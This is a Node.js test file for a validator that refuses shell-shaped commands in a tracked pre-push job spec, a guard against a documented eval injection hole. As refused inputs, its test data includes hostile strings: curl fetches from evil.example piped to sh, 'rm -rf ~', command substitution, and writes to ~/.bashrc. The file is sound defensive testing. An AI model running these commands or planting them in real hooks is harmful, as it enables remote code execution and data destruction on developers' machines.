// Tests for scripts/gate-jobs.cjs — the validator that replaced `eval "$cmd"`
// in .githooks/pre-push.
//
// The defect being regression-guarded: tools/gate-jobs.json is a TRACKED file
// whose `cmd` strings were passed straight to `eval` on every developer's
// machine at push time. One merged PR editing one string was arbitrary code
// execution across the fleet. These tests assert that (a) shell-shaped commands
// are REFUSED rather than interpreted, (b) argv[0] must be on an allowlist, and
// (c) the spec that actually ships still passes.

'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

const { EXIT, Refusal, loadJobs, toArgv, validateSpec } = require('./gate-jobs.cjs');

const REPO_ROOT = path.join(__dirname, '..');

function writeSpec(spec) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'gate-jobs-'));
  const file = path.join(dir, 'gate-jobs.json');
  fs.writeFileSync(file, typeof spec === 'string' ? spec : JSON.stringify(spec));
  return file;
}

// ---------------------------------------------------------------------------
// The shipped spec must keep working
// ---------------------------------------------------------------------------

test('the real tools/gate-jobs.json parses into safe argv vectors', () => {
  const jobs = loadJobs(path.join(REPO_ROOT, 'tools', 'gate-jobs.json'));
  assert.ok(jobs.length > 0, 'the shipped spec must declare jobs');
  for (const job of jobs) {
    assert.ok(job.argv.length >= 1, `${job.id} must have an executable`);
    assert.ok(!job.argv.some((a) => a === ''), `${job.id} must have no empty argv entries`);
  }
  // Spot-check the shape rather than the exact list, which is allowed to grow.
  const byId = Object.fromEntries(jobs.map((j) => [j.id, j.argv]));
  assert.deepEqual(byId.typecheck, ['pnpm', 'run', 'typecheck']);
  assert.deepEqual(byId.sizes, ['node', 'scripts/check-file-sizes.cjs', '--ci']);
});

// ---------------------------------------------------------------------------
// Shell injection through the tracked data file
// ---------------------------------------------------------------------------

const SHELL_SHAPED = [
  ['command chaining', 'pnpm run test; curl http://evil.example/x -o /tmp/y'],
  ['background chaining', 'pnpm run test && rm -rf ~'],
  ['command substitution', 'node -e $(curl http://evil.example/p)'],
  ['backtick substitution', 'node scripts/x.cjs `whoami`'],
  ['pipe to interpreter', 'node scripts/x.cjs | sh'],
  ['output redirection', 'node scripts/x.cjs > ~/.bashrc'],
  ['variable expansion', 'node scripts/$USER.cjs'],
  ['glob', 'node scripts/*.cjs'],
  ['quoting', "node -e 'require(\"child_process\").exec(\"id\")'"],
  ['newline injection', 'pnpm run test\ncurl http://evil.example/x'],
];

for (const [label, cmd] of SHELL_SHAPED) {
  test(`refuses ${label}`, () => {
    assert.throws(() => toArgv('poisoned', cmd), Refusal);
  });
}

test('refuses an executable that is not on the allowlist', () => {
  assert.throws(() => toArgv('poisoned', 'curl http://evil.example/x'), /not on the gate allowlist/);
  assert.throws(() => toArgv('poisoned', 'bash -c whoami'), /not on the gate allowlist/);
  assert.throws(() => toArgv('poisoned', 'powershell -File x.ps1'), /not on the gate allowlist/);
  assert.throws(() => toArgv('poisoned', './evil.sh'), /not on the gate allowlist/);
});

test('accepts the plain argv invocations the gate legitimately runs', () => {
  assert.deepEqual(toArgv('a', 'pnpm run test'), ['pnpm', 'run', 'test']);
  assert.deepEqual(toArgv('b', 'node scripts/x.cjs --ci'), ['node', 'scripts/x.cjs', '--ci']);
  assert.deepEqual(toArgv('c', '  cargo   fmt  --check '), ['cargo', 'fmt', '--check']);
});

test('refuses a job whose id would corrupt the id<TAB>argv wire format', () => {
  assert.throws(() => validateSpec({ jobs: [{ id: 'a\tb', cmd: 'node x.cjs' }] }), Refusal);
  assert.throws(() => validateSpec({ jobs: [{ id: '', cmd: 'node x.cjs' }] }), Refusal);
  assert.throws(() => validateSpec({ jobs: [{ cmd: 'node x.cjs' }] }), Refusal);
});

test('refuses a missing or empty cmd', () => {
  assert.throws(() => validateSpec({ jobs: [{ id: 'a' }] }), Refusal);
  assert.throws(() => validateSpec({ jobs: [{ id: 'a', cmd: '   ' }] }), Refusal);
  assert.throws(() => validateSpec({ jobs: [{ id: 'a', cmd: 42 }] }), Refusal);
});

// ---------------------------------------------------------------------------
// Exit-code contract with .githooks/pre-push
// ---------------------------------------------------------------------------

function runCli(specPath) {
  const { spawnSync } = require('node:child_process');
  return spawnSync(process.execPath, [path.join(__dirname, 'gate-jobs.cjs'), '--print-argv', specPath], {
    encoding: 'utf8',
  });
}

test('CLI exits 2 (fail-CLOSED) on a poisoned spec and prints nothing runnable', () => {
  const spec = writeSpec({ jobs: [{ id: 'evil', cmd: 'pnpm run test; curl http://evil.example/x | sh' }] });
  const r = runCli(spec);
  assert.equal(r.status, EXIT.REFUSE, 'a poisoned spec must be exit 2, not 0');
  assert.match(r.stderr, /REFUSED/);
  assert.equal(r.stdout.trim(), '', 'nothing must reach the hook for execution');
});

test('CLI exits 3 (fail-OPEN path) on a missing, unparseable or empty spec', () => {
  assert.equal(runCli(path.join(os.tmpdir(), 'definitely-not-here.json')).status, EXIT.UNUSABLE);
  assert.equal(runCli(writeSpec('{ not json')).status, EXIT.UNUSABLE);
  assert.equal(runCli(writeSpec({ jobs: [] })).status, EXIT.UNUSABLE);
});

test('CLI exits 0 and emits id<TAB>argv lines for a valid spec', () => {
  const spec = writeSpec({
    jobs: [
      { id: 'one', cmd: 'node scripts/a.cjs --ci' },
      { id: 'two', cmd: 'pnpm run lint' },
    ],
  });
  const r = runCli(spec);
  assert.equal(r.status, EXIT.OK);
  assert.deepEqual(r.stdout.trim().split('\n'), ['one\tnode\tscripts/a.cjs\t--ci', 'two\tpnpm\trun\tlint']);
});
